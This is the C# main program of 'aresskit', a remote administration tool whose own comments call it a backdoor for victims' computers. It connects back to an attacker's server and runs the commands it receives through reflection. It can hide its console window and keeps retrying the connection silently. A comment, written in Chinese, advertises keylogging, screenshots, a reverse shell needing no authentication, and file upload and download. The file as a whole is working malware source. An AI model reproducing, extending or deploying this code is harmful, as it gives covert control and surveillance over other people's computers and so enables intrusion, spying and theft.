using System;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;

namespace aresskit
{
    class Program
    {
        const string server = "localhost"; // Server Hostname or IP Address to connect back to.
        const int port = 9000; // TCP Port to connect back to.
        const bool hideConsole = false; // Show/Hide malicious console on Clients (victims) computer.
        const string cmdSplitter = "::"; // Characters to split Class/Method in command input (ex: Administration::IsAdmin or Administration->IsAdmin)


        private static void sendBackdoor(string server, int port)
        {
            try
            {
                TcpClient client = new TcpClient(server, port);
                NetworkStream stream = client.GetStream();
                string responseData;

                while (true)
                {
                    byte[] shellcode = Misc.byteCode("aresskit> ");

                    stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");

                    // 用於存儲響應ASCII表示的字符串。

                    int bytes = stream.Read(data, 0, data.Length);
                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    responseData = responseData.Replace("\n", string.Empty);

                    if (responseData == "cd")
                        System.IO.Directory.SetCurrentDirectory(responseData.Split(" ".ToCharArray())[1]);
                    else if (responseData == "exit")
                    {   // Disconnect the attacker from the C&C backdoor.

                        client.Close();
                    }
                    else if (responseData == "kill")
                        Environment.Exit(0); // Exit cleanly upon command 'kill'
                    else if (responseData == "help")
                    {
                        string helpMenu = "\n";
                        var theList = Assembly.GetExecutingAssembly().GetTypes().Where(t => t.Namespace == "aresskit").ToList();
                        theList.RemoveAt(theList.IndexOf(typeof(_)));

                        foreach (Type x in theList)
                        {
                            if (x.Name != "<>c" && x.Name != "LowLevelKeyboardProc") // To rid away unused Classes
                                helpMenu += Misc.ShowMethods(x) + "\n";
                        }

                        output = Misc.byteCode(helpMenu);
                    }
                    else
                    {
                        try
                        {
                            if (!responseData.Contains(cmdSplitter))
                            {
                                if (responseData != "")
                                    output = Misc.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
                            }
                            else
                            {
                                responseData = responseData.Trim(); // 移除開頭結尾空白

                                // Will produce: (clas name), (method name), [arg](,)[arg]...
                                string[] classMethod = responseData.Split(new[] { cmdSplitter }, StringSplitOptions.None);


                                Type methodType = Type.GetType("aresskit." + classMethod[0]); // Get type: aresskit.Class
                                object classInstance = Activator.CreateInstance(methodType); // Create instance of 'aresskit.Class'

                                string[] methodData = classMethod[1].Split(new char[0]);
                                MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
                                if (methodInstance == null)
                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + cmdSplitter + classMethod[1] + "'");
                                ParameterInfo[] methodParameters = methodInstance.GetParameters();


                                string parameterString = default(string);
                                string[] parameterArray = { "" };

                                if (methodInstance != null)
                                {
                                    if (methodParameters.Length == 0)
                                    {
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
                                    }
                                    else if (methodParameters.Length == 2 && methodParameters[0].ParameterType.ToString() == "System.String" && methodParameters[1].ParameterType.ToString() == "System.String")
                                    {
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, new object[] { methodData[1], methodData[2] }).ToString() + "\n");
                                    }
                                    else
                                    {
                                        if (methodParameters[0].ParameterType.ToString() == "System.String")
                                        {
                                            for (int i = 1; i < methodData.Length; i++)
                                                parameterString += methodData[i] + " ";
                                            parameterArray[0] = parameterString;
                                        }
                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                    }
                                }
                            }
                        }
                        catch (Exception e)
                        { output = Misc.byteCode(e.Message + "\n"); }
                    }

                    try
                    {
                        stream.Write(output, 0, output.Length); // Send output of command back to attacker.
                    }
                    catch (Exception)
                    {
                        stream.Close();
                        client.Close();
                        break;
                    }
                }

                // Close everything.
                stream.Close();
                client.Close();
            }
            catch (Exception) { while (true) { sendBackdoor(server, port); } } // Pass socket connection silently.
        }

        static void Main(string[] args)
        {
            // Hide Window
            if (hideConsole)
            {
                Toolkit.HideWindow();
            }

            // Fully featured Remote Administration Tool (RAT)
            /*
             * Aresskit配備了網絡工具和管理工具，例如：
              * - 內置端口掃描器
              * - 反向命令提示符殼（簡約，不需要驗證）
              * - UDP / TCP端口監聽器（類似於Netcat）
              * - 文件下載/上傳
              * - - 屏幕截圖
              * - 實時和基於日誌的鍵盤記錄
              * - 自毀功能（保護您的隱私）
            */

            while (true)
            {
                if (Network.checkInternetConn("www.google.com") || server == "localhost")
                {
                    try
                    {
                        // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
                        sendBackdoor(server, port);
                    }
                    catch (SocketException) // Attacker Server has most likely forced disconnect
                    { Console.WriteLine("Attacker has disconnected."); }
                    catch (Exception e)
                    { Console.WriteLine(e); } // pass silently
                }
                System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
            }
        }
    }
}
